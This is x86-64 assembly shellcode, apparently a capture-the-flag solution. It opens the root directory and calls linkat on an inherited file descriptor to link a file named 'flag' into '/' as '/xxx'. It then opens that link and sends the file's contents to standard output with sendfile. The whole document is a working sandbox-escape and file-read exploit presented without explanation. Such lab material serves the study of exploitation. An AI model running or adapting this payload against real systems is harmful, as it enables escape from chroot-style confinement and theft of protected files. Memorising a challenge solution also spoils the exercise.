.intel_syntax noprefix

.section .text
.global _start

_start:
    # /
    # 0x2f
    mov rax, 0x2f
    push rax

    # open('/', NULL, NULL)
    lea rdi, [rsp]
    mov rsi, 0
    mov rdx, 0
    mov rax, 2
    syscall
    mov rbx, rax

    # xxx
    # 0x787878
    mov rax, 0x787878
    push rax

    # flag
    # 0x67616c66
    mov rax, 0x67616c66
    push rax

    # linkat(3, 'flag', dir_fd, 'xxx', 0)
    mov rdi, 3
    lea rsi, [rsp]
    mov rdx, rbx
    lea r10, [rsp+8]
    xor r8, r8
    mov rax, 0x109
    syscall

    # /xxx
    # 0x7878782f
    mov rax, 0x7878782f
    push rax   

    # open('/xxx', NULL, NULL)
    lea rdi, [rsp]
    mov rsi, 0
    mov rdx, 0
    mov rax, 2
    syscall
    mov rbx, rax

    # sendfile(1, flag_fd, 0, 1000)
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 1000
    mov rax, 40
    syscall
